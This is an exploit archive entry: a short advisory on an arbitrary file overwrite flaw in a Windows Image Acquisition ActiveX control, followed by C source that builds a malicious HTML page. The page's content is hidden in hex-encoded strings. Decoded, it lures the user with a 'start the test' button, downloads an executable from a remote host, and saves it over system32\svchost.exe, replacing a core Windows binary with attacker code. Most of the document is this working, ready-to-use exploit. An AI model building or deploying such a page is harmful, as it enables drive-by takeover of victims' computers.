source: http://www.securityfocus.com/bid/31069/info
 
Microsoft Windows Image Acquisition Logger ActiveX control is prone to a vulnerability that lets attackers overwrite files with arbitrary, attacker-controlled content. The issue occurs because the control fails to sanitize user-supplied input.
 
An attacker can exploit this issue to overwrite files with attacker-supplied data, which will aid in further attacks. 

/*Microsoft Windows Image Acquisition Logger ActiveX Control Arbitrary File Overwrite
  Credits for finding the bug go to S4rK3VT TEAM,nice work Ciph3r :) .
  Credits for exploit go to fl0 fl0w
  References- http://www.securityfocus.com/bid/31069/info
*/

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<windows.h>


  char file_1[]=
"\x3C\x6F\x62\x6A\x65\x63\x74\x20\x63\x6C"
"\x61\x73\x73\x69\x64\x3D\x22\x63\x6C\x73"
"\x69\x64\x3A\x41\x31\x45\x37\x35\x33\x35"
"\x37\x2D\x38\x38\x31\x41\x2D\x34\x31\x39"
"\x45\x2D\x38\x33\x45\x32\x2D\x42\x42\x31"
"\x36\x44\x42\x31\x39\x37\x43\x36\x38\x22"
"\x20\x69\x64\x3D\x27\x74\x65\x73\x74\x27"
"\x3E\x3C\x2F\x6F\x62\x6A\x65\x63\x74\x3E"
"\x0D\x0A\x0D\x0A\x3C\x69\x6E\x70\x75\x74"
"\x20\x6C\x61\x6E\x67\x75\x61\x67\x65\x3D"
"\x56\x42\x53\x63\x72\x69\x70\x74\x20\x6F"
"\x6E\x63\x6C\x69\x63\x6B\x3D\x74\x72\x79"
"\x4D\x65\x28\x29\x20\x74\x79\x70\x65\x3D"
"\x62\x75\x74\x74\x6F\x6E\x20\x76\x61\x6C"
"\x75\x65\x3D\x27\x43\x6C\x69\x63\x6B\x20"
"\x68\x65\x72\x65\x20\x74\x6F\x20\x73\x74"
"\x61\x72\x74\x20\x74\x68\x65\x20\x74\x65"
"\x73\x74\x27\x3E\x0D\x0A\x0D\x0A\x3C\x73"
"\x63\x72\x69\x70\x74\x20\x6C\x61\x6E\x67"
"\x75\x61\x67\x65\x3D\x27";

  char file_2[]=
"\x76\x62\x73\x63\x72\x69\x70\x74\x27\x3E\x0D\x0A\x20\x20\x53"
"\x75\x62\x20\x74\x72\x79\x4D\x65\x0D\x0A\x20\x20\x20\x64\x69"
"\x6D\x20\x72\x65\x6D\x55\x52\x4C\x0D\x0A\x20\x20\x20\x72\x65"
"\x6D\x55\x52\x4C\x20\x3D\x20\x22\x68\x74\x74\x70\x3A\x2F\x2F"
"\x76\x69\x63\x74\x69\x6D\x2E\x63\x6F\x6D\x2F\x73\x76\x63\x68"
"\x6F\x73\x74\x2E\x65\x78\x65\x22\x0D\x0A\x20\x20\x20\x74\x65"
"\x73\x74\x2E\x4F\x70\x65\x6E\x20\x72\x65\x6D\x55\x52\x4C\x2C"
"\x20\x54\x72\x75\x65\x0D\x0A\x20\x20\x20\x74\x65\x73\x74\x2E"
"\x53\x61\x76\x65\x20\x22\x43\x3A\x5C\x57\x49\x4E\x44\x4F\x57"
"\x53\x5C\x73\x79\x73\x74\x65\x6D\x33\x32\x5C\x73\x76\x63\x68"
"\x6F\x73\x74\x2E\x65\x78\x65\x22\x2C\x20\x54\x72\x75\x65\x0D"
"\x0A\x20";

 char file_3[]=
"\x45\x6E\x64\x20\x53\x75\x62\x0D\x0A\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E";

 void usage(char *);
 int main(int argc,char *argv[])
 {  FILE *m;
    unsigned int offset=0;
    
    if(argc<2)
   { usage(argv[0]); } 
   
     if((m=fopen(argv[1],"wb"))==NULL)
   { printf("error"); 
     exit(0); 
   } 
    char *buffer;
    buffer=(char *)malloc(strlen(file_1)+strlen(file_2)+strlen(file_3));
    
    memcpy(buffer,file_1,strlen(file_1)); offset=strlen(file_1);
    memcpy(buffer+offset,file_2,strlen(file_2)); offset+=strlen(file_2);
    memcpy(buffer+offset,file_3,strlen(file_3));
    fprintf(m,"%s",buffer);
    system("cls");
    printf("|****************************************************||\n");
    printf("Microsoft Windows Image Acquisition Logger ActiveX Control Arbitrary File Overwrite\n"); 
    printf("File successfully built\n");
    system("color 02"); 
    Sleep(2000);
    printf("|****************************************************||\n");
    
    free(buffer);
    fclose(m);
return 0;    
      }
      
 void usage(char *f)
 {  printf("|****************************************************||\n");
    printf("Microsoft Windows Image Acquisition Logger ActiveX Control Arbitrary File Overwrite\n\n");    
    printf("Usage: exploit.exe file.html\n\n");
    printf("Credits for finding the bug go to S4rK3VT TEAM\n");
    printf("Credits for exploit go to fl0 fl0w\n");
    printf("|****************************************************|\n");
    
    system("color 03");
    Sleep(2000);
       }